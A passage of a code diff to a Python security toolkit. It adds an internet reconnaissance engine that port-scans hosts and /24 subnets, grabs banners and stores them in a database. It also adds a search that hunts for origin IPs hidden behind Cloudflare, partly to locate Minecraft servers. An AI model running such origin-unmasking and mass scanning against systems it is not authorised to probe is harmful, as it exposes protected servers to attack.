 <table><tr><th>Timestamp</th><th>Level</th><th>Source</th><th>Message</th></tr>"""
@@ -4785,9 +6892,14 @@ def menu_hash_crypto():
         print(f"  {c('[5]', Fore.GREEN)}  Password Generator")
         print(f"  {c('[b]', Fore.CYAN)}   Back")
         print()
-        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if ch == "b": break
-        {"1":hash_generator,"2":hash_identifier,"3":hash_cracker,"4":encoder_decoder,"5":password_generator}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+        try:
+            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if ch == "b": break
+            {"1":hash_generator,"2":hash_identifier,"3":hash_cracker,"4":encoder_decoder,"5":password_generator}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 def menu_system_audit():
     while True:
@@ -4801,10 +6913,15 @@ def menu_system_audit():
         print(f"  {c('[7]', Fore.GREEN)}  Kernel Hardening Check")
         print(f"  {c('[b]', Fore.CYAN)}   Back")
         print()
-        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if ch == "b": break
-        {"1":audit_rootkit_detection,"2":audit_suid_scanner,"3":audit_cron_jobs,"4":audit_file_permissions,
-         "5":audit_open_ports,"6":audit_failed_logins,"7":audit_kernel_hardening}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+        try:
+            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if ch == "b": break
+            {"1":audit_rootkit_detection,"2":audit_suid_scanner,"3":audit_cron_jobs,"4":audit_file_permissions,
+             "5":audit_open_ports,"6":audit_failed_logins,"7":audit_kernel_hardening}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 def menu_adv_network():
     while True:
@@ -4818,27 +6935,739 @@ def menu_adv_network():
         print(f"  {c('[7]', Fore.GREEN)}  DHCP Scanner")
         print(f"  {c('[b]', Fore.CYAN)}   Back")
         print()
+        try:
+            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if ch == "b": break
+            {"1":net_port_knocking,"2":net_banner_grab,"3":net_reverse_shell_detect,"4":net_speed_test,
+             "5":net_mac_lookup,"6":net_lan_discovery,"7":net_dhcp_scan}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
+
+def osint_recon_engine():
+    """Censys-style Internet Reconnaissance Engine — finds real IPs using Shodan InternetDB + active scanning + SQLite DB"""
+    DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "recon.db")
+    _init_db = lambda: sqlite3.connect(DB_PATH)
+    conn = _init_db()
+    conn.execute("CREATE TABLE IF NOT EXISTS hosts (ip TEXT PRIMARY KEY, hostname TEXT, domain TEXT, first REAL, last REAL, is_cf INT DEFAULT 0, is_origin INT DEFAULT 0, source TEXT)")
+    conn.execute("CREATE TABLE IF NOT EXISTS ports (ip TEXT, port INT, protocol TEXT DEFAULT 'tcp', service TEXT, banner TEXT, first REAL, last REAL, PRIMARY KEY(ip, port, protocol))")
+    conn.execute("CREATE TABLE IF NOT EXISTS scans (target TEXT, type TEXT, ports_found INT, ts REAL)")
+    conn.commit(); conn.close()
+    _now = lambda: time.time()
+
+    def _query_shodan(ip):
+        try:
+            r = requests.get(f"https://internetdb.shodan.io/{ip}", timeout=8)
+            if r.status_code == 200: return r.json()
+        except: pass
+        return None
+
+    def _scan_ports(ip, ports=None):
+        if ports is None: ports = [22, 80, 443, 8080, 8443, 25565, 25566, 19132, 3306, 5432, 6379, 27017, 21, 23, 25, 53, 110, 111, 139, 143, 445, 993, 995, 1433, 1521, 2049, 3389, 5900, 8443, 9000, 9090, 9200, 11211, 50070]
+        found = []
+        def _probe(p):
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1.5)
+            try:
+                if s.connect_ex((ip, p)) == 0: found.append(p)
+            finally: s.close()
+        with ThreadPoolExecutor(max_workers=50) as ex:
+            for p in ports: ex.submit(_probe, p)
+        return found
+
+    def _grab_banner(ip, port):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2); s.connect((ip, port))
+            if port in (80, 8080, 8000):
+                s.sendall(b"GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % ip.encode()); data = s.recv(1024)
+                for line in data.decode("utf-8", errors="replace").split("\r\n"):
+                    if "Server:" in line: s.close(); return line.strip()
+            elif port == 443:
+                try:
+                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+                    ss = ctx.wrap_socket(s, server_hostname=ip); ss.settimeout(2); ss.sendall(b"GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % ip.encode())
+                    data = ss.recv(1024); ss.close()
+                    for line in data.decode("utf-8", errors="replace").split("\r\n"):
+                        if "Server:" in line: return line.strip()
+                except: pass
+            elif port in (25565, 25566):
+                resp = _mc_server_ping(ip, port, 2)
+                if resp: return str(resp.get("description", {}).get("text", ""))[:60]
+            s.close()
+            try: svc = socket.getservbyport(port); return svc
+            except: return "unknown"
+        except: return None
+
+    def _store_host(ip, hostname=None, domain=None, source="scan", is_cf=False, is_origin=False):
+        conn = _init_db(); ts = _now()
+        try:
+            conn.execute("INSERT OR IGNORE INTO hosts(ip,hostname,domain,first,last,is_cf,is_origin,source) VALUES(?,?,?,?,?,?,?,?)",
+                        (ip, hostname or "", domain or "", ts, ts, 1 if is_cf else 0, 1 if is_origin else 0, source))
+            conn.execute("UPDATE hosts SET last=?,hostname=COALESCE(NULLIF(?,''),hostname),domain=COALESCE(NULLIF(?,''),domain),source=? WHERE ip=?", (ts, hostname or "", domain or "", source, ip))
+        finally: conn.commit(); conn.close()
+
+    def _store_port(ip, port, service=None, banner=None):
+        conn = _init_db(); ts = _now()
+        try:
+            conn.execute("INSERT OR IGNORE INTO ports(ip,port,service,banner,first,last) VALUES(?,?,?,?,?,?)", (ip, port, service or "", banner or "", ts, ts))
+            conn.execute("UPDATE ports SET last=?,service=COALESCE(NULLIF(?,''),service),banner=COALESCE(NULLIF(?,''),banner) WHERE ip=? AND port=?", (ts, service or "", banner or "", ip, port))
+        finally: conn.commit(); conn.close()
+
+    def _fmt_time(ts):
+        return dt.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M") if ts else "never"
+
+    while True:
+        header_box("Internet Recon Engine", Fore.YELLOW)
+        conn = _init_db()
+        total_hosts = conn.execute("SELECT COUNT(*) FROM hosts").fetchone()[0]
+        total_ports = conn.execute("SELECT COUNT(*) FROM ports").fetchone()[0]
+        conn.close()
+        print(f"  {c(f'DB: {total_hosts} hosts, {total_ports} ports', Fore.CYAN)}")
+        print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
+        print(f"  {c('[1]', Fore.GREEN)}  Query domain (DNS + crt.sh + Shodan)")
+        print(f"  {c('[2]', Fore.GREEN)}  Query IP (Shodan InternetDB)")
+        print(f"  {c('[3]', Fore.GREEN)}  Scan IP/range for open ports")
+        print(f"  {c('[4]', Fore.GREEN)}  Search database")
+        print(f"  {c('[5]', Fore.GREEN)}  Database stats")
+        print(f"  {c('[6]', Fore.GREEN)}  Continuous scan (crontab mode)")
+        print(f"  {c('[b]', Fore.CYAN)}   Back")
+        print()
         ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
         if ch == "b": break
-        {"1":net_port_knocking,"2":net_banner_grab,"3":net_reverse_shell_detect,"4":net_speed_test,
-         "5":net_mac_lookup,"6":net_lan_discovery,"7":net_dhcp_scan}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+
+        if ch == "1":
+            header_box("Domain Reconnaissance", Fore.YELLOW)
+            domain = input(f"  {c(f'Domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if not domain: continue
+            print(f"  {c(f'Resolving {domain}...', Fore.CYAN)}")
+            found_ips = set()
+            try:
+                for info in socket.getaddrinfo(domain, 0):
+                    ip = info[4][0]
+                    if ip not in found_ips: found_ips.add(ip); print(f"    {c(ip, Fore.GREEN)} (DNS)");
+                    _store_host(ip, domain, domain, "dns")
+            except: print(f"  {RED}DNS resolution failed.{RESET}")
+            print(f"  {c('Querying crt.sh...', Fore.CYAN)}")
+            try:
+                text = _http_get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=15)
+                if text:
+                    subs = set()
+                    for entry in json.loads(text):
+                        for name in entry.get("name_value", "").split("\n"):
+                            name = name.strip().lower()
+                            if name.endswith(f".{domain}") or name == domain: subs.add(name)
+                    def _dig_sub(sd):
+                        try:
+                            r = subprocess.run(["dig", "+short", "+time=2", "+tries=1", sd], capture_output=True, text=True, timeout=3)
+                            for line in r.stdout.strip().splitlines():
+                                ip = line.strip().rstrip(".")
+                                try: socket.inet_aton(ip); return (sd, ip)
+                                except: pass
+                        except: pass
+                        return None
+                    with ThreadPoolExecutor(max_workers=20) as ex:
+                        fs = {ex.submit(_dig_sub, s): s for s in list(subs)[:50]}
+                        for f in as_completed(fs):
+                            r = f.result()
+                            if r and r[1] not in found_ips:
+                                sd, ip = r; found_ips.add(ip)
+                                is_cf = any(ip.startswith(p) for p in ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.", "104.24.", "104.25.", "104.26.", "104.27.", "172.64.", "172.65.", "172.66.", "172.67.", "173.245.", "103.21.", "103.22.", "103.31.", "141.101.", "108.162.", "190.93.", "188.114.", "197.234.", "198.41."])
+                                label = f"CF {sd}" if is_cf else f"   {sd}"
+                                color = Fore.RED if is_cf else Fore.GREEN
+                                print(f"    {c(label):30s} {c(ip, Fore.YELLOW)}")
+                                _store_host(ip, sd, domain, "crt.sh", is_cf, not is_cf)
+            except: pass
+            print(f"  {c(SYM_CHECK + f' Found {len(found_ips)} IPs', Fore.GREEN)}")
+            if found_ips:
+                non_cf = [ip for ip in found_ips if not any(ip.startswith(p) for p in ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.", "104.24.", "104.25.", "104.26.", "104.27.", "172.64.", "172.65.", "172.66.", "172.67.", "173.245.", "103.21.", "103.22.", "103.31.", "141.101.", "108.162.", "190.93.", "188.114.", "197.234.", "198.41."])]
+                if non_cf:
+                    print(f"  {c('Candidate origin IPs:', Fore.GREEN)}")
+                    for ip in non_cf: print(f"    {c(ip, Fore.GREEN)}")
+                    r2 = input(f"  {c(f'Scan these origin candidates for open ports? (y/N) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
+                    if r2 == "y":
+                        for ip in non_cf:
+                            print(f"  {c(f'Scanning {ip}...', Fore.CYAN)}")
+                            ports = _scan_ports(ip)
+                            for p in ports:
+                                svc = _grab_banner(ip, p)
+                                print(f"    {c(f'{p:5d}/tcp', Fore.GREEN)} {c(svc or '', Fore.CYAN)}")
+                                _store_port(ip, p, svc)
+                            _store_host(ip, domain=domain, source="scan")
+
+        elif ch == "2":
+            header_box("Shodan InternetDB Query", Fore.YELLOW)
+            ip = input(f"  {c(f'IP {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if not ip: continue
+            try: socket.inet_aton(ip)
+            except: print(f"  {RED}Invalid IP.{RESET}"); continue
+            print(f"  {c('Querying Shodan InternetDB...', Fore.CYAN)}")
+            data = _query_shodan(ip)
+            if data:
+                ports = data.get("ports", []); hostnames = data.get("hostnames", []); vulns = data.get("vulns", [])
+                print(f"  Ports: {c(str(ports), Fore.GREEN)}")
+                print(f"  Hostnames: {c(str(hostnames), Fore.CYAN)}")
+                if vulns: print(f"  Vulns: {c(str(vulns), Fore.RED)}")
+                _store_host(ip, hostnames[0] if hostnames else "", "shodan", is_origin=True)
+                for p in ports: _store_port(ip, p, "shodan", None)
+                r2 = input(f"  {c(f'Grab banners on open ports? (y/N) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
+                if r2 == "y":
+                    for p in ports[:20]:
+                        svc = _grab_banner(ip, p)
+                        if svc: print(f"    {c(f'{p:5d}/tcp', Fore.GREEN)} {c(svc, Fore.CYAN)}")
+                        _store_port(ip, p, svc)
+                r3 = input(f"  {c(f'Scan neighbor /24 subnet? (y/N) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
+                if r3 == "y":
+                    parts = ip.split("."); base = f"{parts[0]}.{parts[1]}.{parts[2]}"
+                    print(f"  {c(f'Scanning {base}.0/24 on common ports...', Fore.CYAN)}")
+                    def _scan_one(ip2):
+                        data2 = _query_shodan(ip2)
+                        if data2:
+                            pts = data2.get("ports", [])
+                            if pts:
+                                _store_host(ip2, domain=base, source="shodan-subnet")
+                                for p2 in pts: _store_port(ip2, p2, "shodan")
+                                return (ip2, pts)
+                        return None
+                    with ThreadPoolExecutor(max_workers=50) as ex:
+                        fs = {ex.submit(_scan_one, f"{base}.{i}"): i for i in range(1, 255)}
+                        for f in as_completed(fs):
+                            r = f.result()
+                            if r: print(f"    {c(r[0], Fore.GREEN):16s} ports: {c(str(r[1]), Fore.CYAN)}")
+            else:
+                print(f"  {YELLOW}No data from Shodan. Try a manual scan.{RESET}")
+                _store_host(ip, source="manual")
+
+        elif ch == "3":
+            header_box("Port Scanner", Fore.YELLOW)
+            target = input(f"  {c(f'Target IP or CIDR (e.g. 1.2.3.4 or 1.2.3.0/24) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if not target: continue
+            nmap_has = shutil.which("nmap")
+            if nmap_has:
+                print(f"  {c('Using nmap (fast) — Ctrl+C to skip any slow part...', Fore.CYAN)}")
+                try:
+                    r = subprocess.run(["nmap", "-T4", "-Pn", "-p", "22,80,443,8080,8443,25565,25566,19132,3306,5432,6379,27017,21,23,25,53,110,111,139,143,445,993,995,1433,1521,2049,3389,5900,8443,9000,9090,9200,11211,50070,2022,2222,8000,8888,3000,5000,8443,9090,10000", target],
+                                       capture_output=True, text=True, timeout=120)
+                    nmap_ports = []
+                    for line in r.stdout.splitlines():
+                        m = re.match(r'^(\d+)/tcp\s+open', line)
+                        if m and int(m.group(1)) not in nmap_ports: nmap_ports.append(int(m.group(1)))
+                        ip_m = re.match(r'Nmap scan report for ([\d.]+)', line)
+                        if ip_m: print(f"  {c(f'Scanning {ip_m.group(1)}...', Fore.CYAN)}")
+                    if nmap_ports:
+                        print(f"  {c(f'Open ports: {nmap_ports}', Fore.GREEN)}")
+                        for p in nmap_ports:
+                            svc = _grab_banner(target, p)
+                            _store_port(target, p, svc)
+                except subprocess.TimeoutExpired:
+                    print(f"  {YELLOW}nmap timed out.{RESET}")
+            else:
+                print(f"  {c('Using Python socket scanner...', Fore.CYAN)}")
+                ips = []
+                if "/" in target:
+                    import ipaddress
+                    for ip in ipaddress.IPv4Network(target, strict=False): ips.append(str(ip))
+                else: ips = [target]
+                for ip in ips[:256]:
+                    ports = _scan_ports(ip)
+                    if ports:
+                        print(f"  {c(ip, Fore.GREEN):16s} ports: {c(str(ports), Fore.CYAN)}")
+                        _store_host(ip, source="scan")
+                        for p in ports:
+                            svc = _grab_banner(ip, p)
+                            _store_port(ip, p, svc)
+
+        elif ch == "4":
+            header_box("Database Search", Fore.YELLOW)
+            q = input(f"  {c(f'Search (IP, port, domain, service) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if not q: continue
+            conn = _init_db()
+            try:
+                rows = conn.execute("SELECT * FROM hosts WHERE ip LIKE ? OR domain LIKE ?", (f"%{q}%", f"%{q}%")).fetchall()
+                if rows:
+                    print(f"  {c(f'Hosts ({len(rows)}):', Fore.GREEN)}")
+                    for r in rows: print(f"    {c(r[0], Fore.GREEN):16s} {c(r[2], Fore.CYAN):30s} first:{_fmt_time(r[3])} {c('[origin]' if r[6] else '', Fore.GREEN)}")
+                qn = int(q) if q.isdigit() else None
+                if qn:
+                    rows2 = conn.execute("SELECT DISTINCT h.ip, h.domain, p.port, p.service FROM hosts h JOIN ports p ON h.ip=p.ip WHERE p.port=?", (qn,)).fetchall()
+                    if rows2:
+                        print(f"  {c(f'Hosts with port {qn} ({len(rows2)}):', Fore.GREEN)}")
+                        for r in rows2: print(f"    {c(r[0], Fore.GREEN):16s} port={c(str(r[2]), Fore.CYAN)} {c(r[3], Fore.YELLOW)}")
+                rows3 = conn.execute("SELECT * FROM ports WHERE service LIKE ? OR banner LIKE ?", (f"%{q}%", f"%{q}%")).fetchall()
+                if rows3:
+                    print(f"  {c(f'Ports ({len(rows3)}):', Fore.GREEN)}")
+                    for r in rows3: print(f"    {c(r[0], Fore.GREEN):16s} {c(f'{r[1]:5d}/{r[2]}', Fore.CYAN)} {c(r[3], Fore.YELLOW)}")
+                if not rows and not rows3: print(f"  {YELLOW}No results.{RESET}")
+            finally: conn.close()
+
+        elif ch == "5":
+            conn = _init_db()
+            h_total = conn.execute("SELECT COUNT(*) FROM hosts").fetchone()[0]
+            p_total = conn.execute("SELECT COUNT(*) FROM ports").fetchone()[0]
+            origins = conn.execute("SELECT COUNT(*) FROM hosts WHERE is_origin=1").fetchone()[0]
+            cf = conn.execute("SELECT COUNT(*) FROM hosts WHERE is_cf=1").fetchone()[0]
+            top_ports = conn.execute("SELECT port, COUNT(*) as cnt FROM ports GROUP BY port ORDER BY cnt DESC LIMIT 15").fetchall()
+            top_services = conn.execute("SELECT service, COUNT(*) as cnt FROM ports WHERE service!='' GROUP BY service ORDER BY cnt DESC LIMIT 15").fetchall()
+            last_scans = conn.execute("SELECT target, type, ports_found, ts FROM scans ORDER BY ts DESC LIMIT 5").fetchall()
+            conn.close()
+            info_box("DB Statistics", [
+                f"Total hosts: {h_total}",
+                f"Origin candidates: {origins}",
+                f"Cloudflare IPs: {cf}",
+                f"Total ports: {p_total}",
+                f"Top ports: {', '.join(f'{p}({c})' for p,c in top_ports[:8])}",
+                f"Top services: {', '.join(f'{s}({c})' for s,c in top_services[:5])}",
+                f"Recent scans: {len(last_scans)}",
+            ], Fore.YELLOW)
+
+        elif ch == "6":
+            header_box("Continuous Scan Mode", Fore.YELLOW)
+            print(f"  {c('This will continuously scan discovered IPs on a timer.', Fore.CYAN)}")
+            print(f"  {c('Useful for monitoring infrastructure changes.', Fore.CYAN)}")
+            duration = input(f"  {c(f'Run for how many minutes? (0=cancel) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if not duration.isdigit() or int(duration) == 0: continue
+            dur_m = int(duration)
+            interval = input(f"  {c(f'Rescan interval in seconds (default 300) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            interval = int(interval) if interval.isdigit() else 300
+            end = _now() + dur_m * 60
+            print(f"  {c(f'Monitoring for {dur_m} minutes, rescanning every {interval}s...', Fore.GREEN)}")
+            print(f"  {c('Press Ctrl+C to stop early.', Fore.YELLOW)}")
+            try:
+                while _now() < end:
+                    conn = _init_db()
+                    ips = [r[0] for r in conn.execute("SELECT DISTINCT ip FROM hosts WHERE is_cf=0 ORDER BY last ASC").fetchall()]
+                    conn.close()
+                    for ip in ips[:20]:
+                        print(f"  {c(f'Rescanning {ip}...', Fore.CYAN)}", end=" ")
+                        sys.stdout.flush()
+                        ports = _scan_ports(ip)
+                        if ports:
+                            print(f"{c(f'found {len(ports)} ports', Fore.GREEN)}")
+                            for p in ports:
+                                svc = _grab_banner(ip, p)
+                                _store_port(ip, p, svc)
+                        else: print(f"{dim('no new ports')}")
+                        _store_host(ip, source="rescan")
+                    conn = _init_db()
+                    conn.execute("INSERT INTO scans(target,type,ports_found,ts) VALUES(?,?,?,?)", ("batch", "rescan", 0, _now()))
+                    conn.commit(); conn.close()
+                    remaining = max(0, end - _now())
+                    if remaining > 0:
+                        print(f"  {dim(f'Waiting {interval}s before next cycle...')}")
+                        time.sleep(min(interval, remaining))
+            except KeyboardInterrupt:
+                print(f"\n  {YELLOW}Continuous scan stopped.{RESET}")
+
+    print()
+
+
+def osint_censys_search():
+    """Censys Search — no API key. Shows ALL hosts (CF + origin) + services + certs, exactly like Censys."""
+    header_box("Censys Search (No API Key)", Fore.YELLOW)
+    target = input(f"  {c(f'IP or domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
+    if not target: return
+    is_ip = False
+    try: socket.inet_aton(target); is_ip = True
+    except: pass
+
+    start = time.time()
+    domain = target if not is_ip else None
+    CF_PREFIXES = ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
+                   "104.24.", "104.25.", "104.26.", "104.27.", "172.64.", "172.65.", "172.66.", "172.67.",
+                   "173.245.", "103.21.", "103.22.", "103.31.", "141.101.", "108.162.", "190.93.", "188.114.",
+                   "197.234.", "198.41."]
+    def _is_cf(ip): return any(ip.startswith(p) for p in CF_PREFIXES)
+    def _fetch(url, timeout=8):
+        try:
+            r = requests.get(url, timeout=timeout, headers={"User-Agent": "Mozilla/5.0"}, verify=False)
+            return r.text if r.status_code == 200 else None
+        except: return None
+
+    # ── 1. Resolve DNS (gets CF IPs) ──
+    all_ips = set()
+    if is_ip:
+        all_ips.add(target)
+    else:
+        try:
+            for info in socket.getaddrinfo(target, 0):
+                ip = info[4][0]
+                if ":" not in ip: all_ips.add(ip)
+        except: pass
+
+    # ── 2. Find origin IPs ──
+    origin_ips = set()
+    if domain:
+        print(f"  {c('Finding origin IPs via CT logs + DNS brute-force...', Fore.CYAN)}")
+        try:
+            bypass_results = cf_bypass(domain, verbose=False)
+            for ip in bypass_results:
+                if ip not in all_ips and not _is_cf(ip):
+                    all_ips.add(ip); origin_ips.add(ip)
+            print(f"    {c(f'{len(bypass_results)} origin candidate(s)', Fore.GREEN)}")
+        except Exception as e:
+            print(f"    {c(f'cf_bypass failed: {e}', Fore.RED)}")
+
+        # Try passive DNS for both target domain and root domain
+        root_domain = ".".join(domain.split(".")[-2:]) if len(domain.split(".")) > 2 else domain
+        for pdns_domain in [domain, root_domain]:
+            # AlienVault OTX
+            print(f"  {c(f'OTX passive DNS ({pdns_domain})...', Fore.CYAN)}", end=" ")
+            try:
+                text = _fetch(f"https://otx.alienvault.com/api/v1/indicators/domain/{pdns_domain}/passive_dns", timeout=10)
+                if text:
+                    pdns = json.loads(text).get("passive_dns", [])
+                    found = 0
+                    for entry in pdns:
+                        ip = entry.get("address", "")
+                        try:
+                            socket.inet_aton(ip)
+                            if ip not in all_ips:
+                                all_ips.add(ip); found += 1
+                                if not _is_cf(ip): origin_ips.add(ip)
+                        except: pass
+                    print(f"{c(f'{found} new IPs', Fore.GREEN)}")
+                else:
+                    print(f"{c('empty', Fore.YELLOW)}")
+            except Exception as e:
+                print(f"{c(str(e)[:16], Fore.RED)}")
+
+            # Hackertarget
+            print(f"  {c(f'Hackertarget DNS ({pdns_domain})...', Fore.CYAN)}", end=" ")
+            try:
+                text = _fetch(f"https://api.hackertarget.com/hostsearch/?q={pdns_domain}")
+                if text:
+                    found = 0
+                    for line in text.strip().split("\n"):
+                        if "," in line:
+                            sub, ip = line.split(",", 1)
+                            ip = ip.strip()
+                            try:
+                                socket.inet_aton(ip)
+                                if ip not in all_ips:
+                                    all_ips.add(ip); found += 1
+                                    if not _is_cf(ip): origin_ips.add(ip)
+                            except: pass
+                    print(f"{c(f'{found} new IPs', Fore.GREEN)}")
+                else:
+                    print(f"{c('empty', Fore.YELLOW)}")
+            except Exception as e:
+                print(f"{c(str(e)[:16], Fore.RED)}")
+
+        # crt.sh (both domains)
+        for ct_domain in [domain, root_domain]:
+            print(f"  {c(f'crt.sh + dig ({ct_domain})...', Fore.CYAN)}", end=" ")
+            try:
+                text = _fetch(f"https://crt.sh/?q=%25.{ct_domain}&output=json", timeout=10)
+                if text:
+                    subs = set()
+                    for entry in json.loads(text):
+                        for name in entry.get("name_value", "").split("\n"):
+                            n = name.strip().lower()
+                            if n.endswith(f".{ct_domain}") or n == ct_domain: subs.add(n)
+                    found = 0
+                    with ThreadPoolExecutor(max_workers=30) as ex:
+                        def _dig(host):
+                            try:
+                                r = subprocess.run(["dig", "+short", "+time=2", "+tries=1", host], capture_output=True, text=True, timeout=3)
+                                for line in r.stdout.strip().splitlines():
+                                    ip = line.strip().rstrip(".")
+                                    try: socket.inet_aton(ip); return ip
+                                    except: pass
+                            except: pass
+                            return None
+                        fs = {ex.submit(_dig, s): s for s in list(subs)[:80]}
+                        for f in as_completed(fs):
+                            ip = f.result()
+                            if ip and ip not in all_ips:
+                                all_ips.add(ip); found += 1
+                                if not _is_cf(ip): origin_ips.add(ip)
+                    print(f"{c(f'{found} new IPs', Fore.GREEN)}")
+                else:
+                    print(f"{c('empty', Fore.YELLOW)}")
+            except:
+                print(f"{c(SYM_X, Fore.RED)}")
+
+        # Try mc-status API — might reveal origin IP
+        print(f"  {c('Minecraft server status (mcsrvstat.us)...', Fore.CYAN)}", end=" ")
+        try:
+            text = _fetch(f"https://api.mcsrvstat.us/3/{domain}", timeout=10)
+            if text:
+                j = json.loads(text)
+                motd = " ".join(j.get("motd", {}).get("clean", []))
+                raw_ip = j.get("ip", "")
+                if isinstance(raw_ip, list):
+                    mcip = raw_ip[0] if raw_ip else ""
+                else:
+                    mcip = str(raw_ip).strip("[]")
+                if mcip and mcip not in all_ips:
+                    all_ips.add(mcip); origin_ips.add(mcip)
+                    print(f"{c(f'found {mcip}', Fore.GREEN)}")
+                else:
+                    pc = j.get("players", {}).get("online", 0)
+                    print(f"{c(f'ok ({pc} online)', Fore.GREEN)}")
+            else:
+                print(f"{c('unreachable', Fore.YELLOW)}")
+        except Exception as e:
+            print(f"{c(str(e)[:16], Fore.RED)}")
+
+    # ── 3. Subnet scan around any non-CF IPv4 for MC servers ──
+    non_cf_ips = [ip for ip in all_ips if not _is_cf(ip) and ":" not in ip]
+    if domain and non_cf_ips:
+        print(f"  {c('Scanning /24 subnets around origin candidates for MC servers...', Fore.CYAN)}")
+        scanned = set()
+        for base_ip in non_cf_ips:
+            parts = base_ip.split(".")
+            subnet = f"{parts[0]}.{parts[1]}.{parts[2]}"
+            if subnet in scanned: continue
+            scanned.add(subnet)
+            with ThreadPoolExecutor(max_workers=30) as ex:
+                def _check_scan(ip):
+                    for p in [25565, 25566]:
+                        try:
+                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
+                            r = s.connect_ex((ip, p)); s.close()
+                            if r == 0: return ip
+                        except: pass
+                    return None
+                futs = {ex.submit(_check_scan, f"{subnet}.{o}"): o for o in range(1, 256)}
+                for f in as_completed(futs):
+                    r = f.result()
+                    if r and r not in all_ips:
+                        all_ips.add(r)
+                        origin_ips.add(r)
+                        print(f"    {c(f'[!] MC server found: {r}', Fore.GREEN)}")
+
+    print(f"  {c('Total unique IPs found:', Fore.CYAN)} {c(len(all_ips), Fore.GREEN)}")
+
+    # ── 4. Collect data per IP (Shodan + Geo) ──
+    hosts = {}
+    for ip in sorted(all_ips):
+        hosts[ip] = {"ports": {}, "vulns": [], "hostnames": set(), "asn": {}, "cf": _is_cf(ip),
+                     "origin": ip in origin_ips}
+        data = _fetch(f"https://internetdb.shodan.io/{ip}")
+        if data:
+            try:
+                j = json.loads(data)
+                for h in j.get("hostnames", []): hosts[ip]["hostnames"].add(h)
+                for p in j.get("ports", []): hosts[ip]["ports"][p] = "?"
+                hosts[ip]["vulns"] = j.get("vulns", [])
+            except: pass
+        geo = _fetch(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,proxy,hosting")
+        if geo:
+            try:
+                d = json.loads(geo)
+                if d.get("status") == "success": hosts[ip]["asn"] = d
+            except: pass
+        try:
+            ptr = socket.gethostbyaddr(ip)[0]
+            hosts[ip]["hostnames"].add(ptr)
+        except: pass
+
+        # Probe common ports (supplements Shodan data)
+        if ":" not in ip:
+            for p in [22, 80, 443, 8080, 8443, 25565, 25566, 19132, 2022, 3306, 5432]:
+                if p in hosts[ip]["ports"]: continue
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1.5)
+                try:
+                    if s.connect_ex((ip, p)) == 0: hosts[ip]["ports"][p] = "?"
+                except: pass
+                finally: s.close()
+
+    # ── 4. Certificates from crt.sh ──
+    certs = []
+    if domain:
+        text = _fetch(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=15)
+        if text:
+            seen = set()
+            try:
+                for entry in json.loads(text):
+                    name = entry.get("name_value", ""); issuer = entry.get("issuer_name", "")[:60]
+                    na = entry.get("not_after", "")[:10]; nb = entry.get("not_before", "")[:10]
+                    for n in name.split("\n"):
+                        n = n.strip().lower()
+                        if n.endswith(domain) and n not in seen:
+                            seen.add(n); certs.append((name, issuer, nb, na))
+            except: pass
+
+    elapsed = time.time() - start
+
+    # ══════════════════════════════════════════════════════════
+    #  DISPLAY
+    # ══════════════════════════════════════════════════════════
+    print(f"\n  {c('Search Results for', Fore.GREEN)} {c(domain or target, Fore.YELLOW)}")
+    print(f"  {c('─'*55, Fore.CYAN)}")
+    print(f"  {c('Hosts', Fore.GREEN)}:        {c(len(all_ips), Fore.CYAN)}")
+    print(f"  {c('Certificates', Fore.GREEN)}: {c(len(certs), Fore.CYAN)}")
+    print(f"  {c('Duration', Fore.GREEN)}:     {c(f'{elapsed:.2f}s', Fore.YELLOW)}")
+    print(f"  {c('─'*55, Fore.CYAN)}")
+
+    # ── Display each host ──
+    for ip in sorted(all_ips):
+        hd = hosts[ip]
+        hnames = list(hd["hostnames"])
+        ptr_name = hnames[0] if hnames else ""
+        asn = hd["asn"]
+        is_ipv6 = ":" in ip
+
+        display_ip = ip
